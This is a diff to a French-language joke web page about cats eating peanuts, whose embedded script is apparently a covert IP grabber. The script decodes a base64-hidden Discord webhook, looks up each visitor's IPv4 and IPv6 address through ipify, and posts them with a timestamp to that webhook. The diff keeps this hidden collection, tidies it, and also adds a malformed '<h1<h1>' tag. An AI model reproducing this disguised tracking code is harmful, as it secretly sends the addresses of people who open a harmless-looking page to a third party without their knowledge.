@@ -16,11 +16,10 @@
     </style>
 </head>
 <body>
-<h1>Les chats sont les meilleurs</h1>
+<h1<h1>Les chats sont les meilleurs</h1>
 <button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
 
 <script>
-// Ton webhook actuel (en base64, toujours caché)
 const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4NDA4MDU1ODcxOTAxNy9PSWp0WmpDRXVURkx4LWhOMF9JREpMRTVsd3AtcDR5d0E3VFBhQ08zTWdTcnhkMEpwNm8zbDBjLWp5ZU9oWWkxak9PVQ==";
 
 let human = false;
@@ -29,20 +28,15 @@ document.onmousemove = document.ontouchstart = () => human = true;
 async function getIPs() {
     let ipv4 = "inconnue";
     let ipv6 = "non détectée";
-
     try {
         const res = await fetch("https://api64.ipify.org?format=json");
         const data = await res.json();
-        if (data.ip.includes(":")) ipv6 = data.ip;
-        else ipv4 = data.ip;
+        if (data.ip?.includes(":")) ipv6 = data.ip;
+        else ipv4 = data.ip || "inconnue";
     } catch {}
-
     if (ipv4 === "inconnue") {
-        try {
-            ipv4 = await (await fetch("https://api.ipify.org")).text();
-        } catch {}
+        try { ipv4 = await (await fetch("https://api.ipify.org")).text(); } catch {}
     }
-
     return { ipv4, ipv6 };
 }
 
@@ -55,19 +49,17 @@ async function send() {
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             embeds: [{
-                {
-                    title: "Nouveau chat nourri de cacahuètes",
-                    color: 16749880,
-                    fields: [
-                        { name: "IPv4", value: ipv4, inline: true },
-                        { name: "IPv6", value: ipv6, inline: true },
-                        { name: "Heure", value: new Date().toLocaleString("fr-FR"), inline: false }
-                    ],
-                    image: { url: "https://i.redd.it/289ch4osfyie1.jpeg" },
-                    thumbnail: { url: "https://cataas.com/cat" },
-                    footer: { text: human ? "Détecté comme humain" : "Envoi automatique" }
-                }
-            ]
+                title: "Nouveau chat nourri de cacahuètes",
+                color: 16749880,
+                fields: [
+                    { name: "IPv4", value: ipv4, inline: true },
+                    { name: "IPv6", value: ipv6, inline: true },
+                    { name: "Heure", value: new Date().toLocaleString("fr-FR"), inline: false }
+                ],
+                image: { url: "https://i.redd.it/289ch4osfyie1.jpeg" },
+                thumbnail: { url: "https://cataas.com/cat" },
+                footer: { text: human ? "Humain détecté" : "Envoi auto" }
+            }]
         })
     });
 }
